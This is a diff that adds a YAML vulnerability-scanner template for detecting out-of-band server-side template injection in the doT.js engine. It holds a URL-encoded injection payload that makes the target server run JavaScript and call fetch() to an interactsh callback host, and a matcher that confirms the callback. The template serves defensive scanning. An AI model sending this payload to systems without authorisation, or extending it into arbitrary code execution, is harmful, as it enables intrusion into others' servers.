@@ -1,0 +1,43 @@
+id: dotjs-oob
+
+info:
+  name: DotJS - Out of Band Template Injection
+  author: 0xAwali,DhiyaneshDK
+  severity: high
+  reference:
+    - https://github.com/olado/doT
+    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
+  metadata:
+    verified: true
+  tags: ssti,dast,oast,oob
+
+variables:
+  prefix: "{{rand_text_alpha(5)}}"
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - '%7B%7B%3Dfunction%28%29%7B%0A%20%20fetch%28%22http%3A%2F%2F{{interactsh-url}}%22%2C%20%7B%0A%20%20%20%20headers%3A%20%7B%0A%20%20%20%20%20%20%22{{prefix}}%22%3A%20%22application%2Fjson%22%0A%20%20%20%20%7D%0A%20%20%7D%29%0A%7D%28%29%7D%7D'
+
+    skip-variables-check: true
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'http')"
+          - "contains(to_lower(interactsh_request), to_lower(prefix))"
+        condition: and
+# digest: 4b0a00483046022100cadd085bedcc3eec5c265e4ea1e6c5841d295fcb2a1ea9579d820fd65d7ba76c02210083ea8ab271591441bda5e2be002ac93aa2401588137a13b16dede01998dde774:922c64590222798bb761d5b6d8e72950
